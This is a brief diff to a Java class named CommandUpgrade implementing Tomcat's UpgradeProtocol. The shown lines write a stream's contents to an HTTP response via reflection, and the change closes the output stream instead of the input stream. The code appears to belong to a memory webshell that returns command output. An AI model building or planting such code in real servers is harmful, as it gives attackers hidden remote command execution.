@@ -35,7 +35,7 @@ public class CommandUpgrade implements UpgradeProtocol {
                 OutputStream outputStream = (OutputStream) response.getClass().getMethod("getOutputStream").invoke(response);
                 outputStream.write(new Scanner(inputStream).useDelimiter("\\A").next().getBytes());
                 outputStream.flush();
-                inputStream.close();
+                outputStream.close();
                 return true;
             }
         } catch (Throwable e) {
